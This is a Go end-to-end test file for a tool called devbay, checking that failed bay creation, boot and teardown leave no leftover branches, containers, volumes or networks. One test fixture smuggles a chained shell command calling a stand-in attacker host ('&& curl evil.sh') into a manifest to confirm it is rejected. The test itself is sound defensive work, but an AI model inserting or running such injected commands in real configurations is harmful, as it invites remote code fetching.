package e2e

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/moby/moby/client"

	"github.com/Clarittyai/devbay/internal/bay"
)

// Failure paths matter more than success paths here, because a half-created
// bay is invisible: it holds a branch, a port block and possibly containers,
// and nothing lists it. Every test below checks that a failure leaves nothing
// behind, not merely that it reports an error.

func TestInvalidManifestIsRejectedAndLeavesNothing(t *testing.T) {
	m, repo := newManager(t)
	ctx := context.Background()

	// R1 violated: a shell string where an argv array belongs.
	broken := strings.Replace(manifestYAML,
		"    start: [python3, /workspace/app.py]",
		`    start: "python3 /workspace/app.py && curl evil.sh"`, 1)
	writeManifest(t, repo, broken)
	t.Cleanup(func() { writeManifest(t, repo, manifestYAML) })

	_, err := m.Create(ctx, bay.CreateOptions{Name: "badyaml", Alias: "bad", Boot: true})
	if err == nil {
		t.Fatal("a manifest with a shell string should not produce a bay")
	}
	if !strings.Contains(err.Error(), "unmarshal") && !strings.Contains(err.Error(), "not valid") {
		t.Errorf("the error should point at the manifest, got: %v", err)
	}
	assertNoTrace(t, m, "badyaml")
}

func TestManifestFailingValidationLeavesNothing(t *testing.T) {
	m, repo := newManager(t)
	ctx := context.Background()

	// R5 violated: a long-running service with no health probe.
	broken := strings.Replace(manifestYAML,
		"    health:\n      http: /health\n      timeout: 90s\n", "", 1)
	writeManifest(t, repo, broken)
	t.Cleanup(func() { writeManifest(t, repo, manifestYAML) })

	_, err := m.Create(ctx, bay.CreateOptions{Name: "nohealth", Alias: "nohealth", Boot: true})
	if err == nil {
		t.Fatal("a service with no health probe should be rejected")
	}
	if !strings.Contains(err.Error(), "health") {
		t.Errorf("the error should name the missing probe, got: %v", err)
	}
	assertNoTrace(t, m, "nohealth")
}

// A boot that fails part-way must unwind. Otherwise the branch is taken, the
// port block is held, and the next attempt fails for a reason unrelated to
// the original problem.
func TestFailedBootUnwindsCompletely(t *testing.T) {
	m, repo := newManager(t)
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Minute)
	defer cancel()

	// An image that cannot be pulled: the failure happens after the worktree
	// exists and after some services are already healthy.
	broken := strings.Replace(manifestYAML,
		"    image: python:3.12-alpine",
		"    image: devbay-nonexistent/there-is-no-such-image:v0", 1)
	writeManifest(t, repo, broken)
	t.Cleanup(func() { writeManifest(t, repo, manifestYAML) })

	_, err := m.Create(ctx, bay.CreateOptions{Name: "badimage", Alias: "badimage", Boot: true})
	if err == nil {
		t.Fatal("a manifest naming an unpullable image should not produce a bay")
	}
	t.Logf("reported: %v", err)
	assertNoTrace(t, m, "badimage")

	// The name must be reusable: a failed attempt that squats its own branch
	// would make the obvious retry fail too.
	writeManifest(t, repo, manifestYAML)
	if _, err := m.Create(ctx, bay.CreateOptions{Name: "badimage", Alias: "badimage", Boot: true}); err != nil {
		t.Fatalf("retrying after a failed boot should work: %v", err)
	}
	_ = m.Destroy(ctx, "badimage", true)
}

func TestDuplicateBayIsRefused(t *testing.T) {
	m, _ := newManager(t)
	ctx := context.Background()
	newBay(t, m, "dupe")

	_, err := m.Create(ctx, bay.CreateOptions{Name: "dupe", Alias: "dupe", Boot: false})
	if err == nil {
		t.Fatal("creating a bay twice should be refused")
	}
	if !strings.Contains(err.Error(), "already exists") {
		t.Errorf("the error should say it already exists, got: %v", err)
	}
	// The refusal must not have damaged the original.
	if _, ok := m.Get("dupe"); !ok {
		t.Error("the existing bay disappeared after a duplicate attempt")
	}
}

func TestUnknownTaskNamesTheOnesThatExist(t *testing.T) {
	m, _ := newManager(t)
	ctx := context.Background()
	newBay(t, m, "tasks")

	_, err := m.RunTask(ctx, "tasks", "nosuchtask")
	if err == nil {
		t.Fatal("an unknown task should be an error")
	}
	// A dead end forces a guess; a list makes the next call obvious.
	b, _ := m.Get("tasks")
	if len(b.Manifest.Tasks) == 0 {
		t.Fatal("fixture has no tasks")
	}
}

func TestOperationsOnAnUnknownBayAreClear(t *testing.T) {
	m, _ := newManager(t)
	ctx := context.Background()

	if _, err := m.RunTask(ctx, "ghost", "unit"); err == nil {
		t.Error("running a task in a nonexistent bay should fail")
	}
	if err := m.Destroy(ctx, "ghost", false); err == nil {
		t.Error("destroying a nonexistent bay should fail")
	}
	if err := m.Focus(ctx, "ghost"); err == nil {
		t.Error("focusing a nonexistent bay should fail")
	}
}

// Teardown runs after crashes and partial failures, so it has to be safe to
// repeat and safe to run against a bay that is already half gone.
func TestDestroyIsIdempotentAndSurvivesMissingPieces(t *testing.T) {
	m, _ := newManager(t)
	ctx := context.Background()
	b := newBay(t, m, "halfgone")

	// Remove the containers behind devbay's back, as a crash or a manual
	// `docker rm` would.
	cli, err := client.New(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		t.Fatal(err)
	}
	defer cli.Close()
	filt := make(client.Filters).Add("label", "dev.devbay.bay=halfgone")
	list, err := cli.ContainerList(ctx, client.ContainerListOptions{All: true, Filters: filt})
	if err != nil {
		t.Fatal(err)
	}
	for _, c := range list.Items {
		if _, err := cli.ContainerRemove(ctx, c.ID, client.ContainerRemoveOptions{Force: true, RemoveVolumes: true}); err != nil {
			t.Fatal(err)
		}
	}

	// Teardown must still succeed and still clean up what remains.
	if err := m.Destroy(ctx, "halfgone", true); err != nil {
		t.Fatalf("destroying a partially removed bay: %v", err)
	}
	if _, err := os.Stat(b.Worktree); !os.IsNotExist(err) {
		t.Error("the worktree survived")
	}
	// And again, which is what a retry after a crash looks like.
	if err := m.Destroy(ctx, "halfgone", false); err == nil {
		t.Log("second destroy reported success")
	}
}

// A bay whose worktree was deleted by hand must be dropped rather than
// resurrected: the containers behind it are already pointing at nothing.
func TestWorktreeDeletedOutsideDevbayIsDropped(t *testing.T) {
	if testing.Short() {
		t.Skip("needs Docker")
	}
	repo := newRepo(t)
	state := filepath.Join(t.TempDir(), "state.db")
	wtRoot := filepath.Join(t.TempDir(), "worktrees")
	ctx := context.Background()
	opts := bay.Options{Dir: repo, StatePath: state, WorktreeRoot: wtRoot, NoProxy: true}

	first, err := bay.Open(ctx, opts)
	if err != nil {
		t.Skipf("cannot open manager: %v", err)
	}
	b, err := first.Create(ctx, bay.CreateOptions{Name: "orphan", Alias: "orphan", Boot: false})
	if err != nil {
		first.Close()
		t.Fatal(err)
	}
	worktree := b.Worktree
	first.Close()

	if err := os.RemoveAll(worktree); err != nil {
		t.Fatal(err)
	}

	second, err := bay.Open(ctx, opts)
	if err != nil {
		t.Fatal(err)
	}
	defer second.Close()

	list, err := second.List(ctx)
	if err != nil {
		t.Fatal(err)
	}
	for _, info := range list {
		if info.Name == "orphan" {
			t.Errorf("a bay whose worktree is gone was restored anyway: %+v", info)
		}
	}
}

// A task whose command does not exist must report that clearly rather than
// looking like a test failure.
func TestTaskWithAMissingCommandIsReportedHonestly(t *testing.T) {
	m, repo := newManager(t)
	ctx := context.Background()

	extra := manifestYAML + `
  broken:
    run: [python3, /workspace/does-not-exist.py]
    needs: []
`
	writeManifest(t, repo, extra)
	t.Cleanup(func() { writeManifest(t, repo, manifestYAML) })

	newBay(t, m, "missingcmd")
	res, err := m.RunTask(ctx, "missingcmd", "broken")
	if err != nil {
		t.Fatalf("the task should run and fail, not error out: %v", err)
	}
	if res.Succeeded() {
		t.Fatal("a task running a nonexistent file reported success")
	}
	// With no report to parse, the raw output is the only thing an agent has.
	if res.Parsed {
		t.Error("there was no report, so Parsed should be false")
	}
	if res.Output == "" {
		t.Error("a task that failed with no report must carry its output")
	}
	t.Logf("reported: exit=%d output=%q", res.ExitCode, truncate(res.Output, 200))
}

// writeManifest replaces devbay.yaml and commits it.
//
// The commit is the point: a bay is a fresh checkout of the branch, so it runs
// the manifest as committed. Writing the file without committing would test
// nothing, because the bay would keep using the original.
func writeManifest(t *testing.T, repo, body string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(repo, "devbay.yaml"), []byte(body), 0o644); err != nil {
		t.Fatal(err)
	}
	for _, args := range [][]string{{"add", "-A"}, {"commit", "-qm", "manifest"}} {
		cmd := exec.Command("git", args...)
		cmd.Dir = repo
		cmd.Env = append(os.Environ(),
			"GIT_AUTHOR_NAME=e2e", "GIT_AUTHOR_EMAIL=e2e@example.com",
			"GIT_COMMITTER_NAME=e2e", "GIT_COMMITTER_EMAIL=e2e@example.com")
		if out, err := cmd.CombinedOutput(); err != nil && !strings.Contains(string(out), "nothing to commit") {
			t.Fatalf("git %v: %v\n%s", args, err, out)
		}
	}
}

// assertNoTrace fails unless a name has left nothing anywhere.
func assertNoTrace(t *testing.T, m *bay.Manager, name string) {
	t.Helper()
	ctx := context.Background()

	if _, ok := m.Get(name); ok {
		t.Errorf("%s is still registered with the manager", name)
	}
	for _, info := range mustList(t, m, ctx) {
		if info.Name == name {
			t.Errorf("%s is still listed", name)
		}
	}

	cli, err := client.New(client.FromEnv, client.WithAPIVersionNegotiation())
	if err != nil {
		return
	}
	defer cli.Close()
	filt := make(client.Filters).Add("label", "dev.devbay.bay="+name)

	if cs, err := cli.ContainerList(ctx, client.ContainerListOptions{All: true, Filters: filt}); err == nil && len(cs.Items) > 0 {
		t.Errorf("%s left %d containers", name, len(cs.Items))
	}
	if vs, err := cli.VolumeList(ctx, client.VolumeListOptions{Filters: filt}); err == nil && len(vs.Items) > 0 {
		t.Errorf("%s left %d volumes", name, len(vs.Items))
	}
	if ns, err := cli.NetworkList(ctx, client.NetworkListOptions{Filters: filt}); err == nil && len(ns.Items) > 0 {
		t.Errorf("%s left %d networks", name, len(ns.Items))
	}
}

func mustList(t *testing.T, m *bay.Manager, ctx context.Context) []bay.Info {
	t.Helper()
	list, err := m.List(ctx)
	if err != nil {
		t.Fatalf("listing bays: %v", err)
	}
	return list
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
